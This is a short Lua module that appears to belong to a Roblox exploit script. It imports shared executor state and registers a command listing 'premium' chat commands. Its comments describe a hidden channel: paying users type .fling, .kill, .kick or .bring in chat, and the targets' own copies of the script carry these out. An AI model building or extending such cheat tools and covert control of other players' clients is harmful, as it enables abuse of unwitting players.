local _VC = getgenv()._VC
local LP               = _VC.LP
local Players          = _VC.Players
local RunService       = _VC.RunService
local UserInputService = _VC.UserInputService
local TweenService     = _VC.TweenService
local MarketplaceService = _VC.MarketplaceService
local Debris           = _VC.Debris
local Camera           = _VC.Camera
local C                = _VC.C
local TF               = _VC.TF
local TM               = _VC.TM
local N                = _VC.N
local Tween            = _VC.Tween
local Corner           = _VC.Corner
local Stroke           = _VC.Stroke
local Pad              = _VC.Pad
local Config           = _VC.Config
local IsPremium        = _VC.IsPremium
local freeIds          = _VC.freeIds
local premIds          = _VC.premIds
local Notify           = _VC.Notify
local FindPlayer       = _VC.FindPlayer
local PStr             = _VC.PStr
local Reg              = _VC.Reg
local RefreshActive    = _VC.RefreshActive
local Screen           = _VC.Screen
local vcUsers          = _VC.vcUsers
local IsVoidUser       = _VC.IsVoidUser
local IsWhitelisted    = _VC.IsWhitelisted
-- PREMIUM COMMANDS  (type directly in Roblox chat)
-- Premium users just type .fling Player1 in chat.
-- The target's script sees it and executes locally.
-- No signals, no encoding, no suppression needed.
--
-- Available commands:
--   .fling <player>
--   .bring <player>
--   .bringall
--   .freeze <player>
--   .unfreeze <player>
--   .kill <player>
--   .kick <player>
--   .unkick <player>
--   .chat <player> <message>

-- Notify premium user that the command was typed
-- (the actual execution happens on the target's client via detection.lua)
Reg("prem",  {"premium","pcmds"}, "List premium dot-commands (type in Roblox chat)", true, function()
    Notify("Premium Commands",
        ".fling .bring .bringall .freeze .unfreeze .kill .kick .unkick .chat",
        "gold", 8)
end)

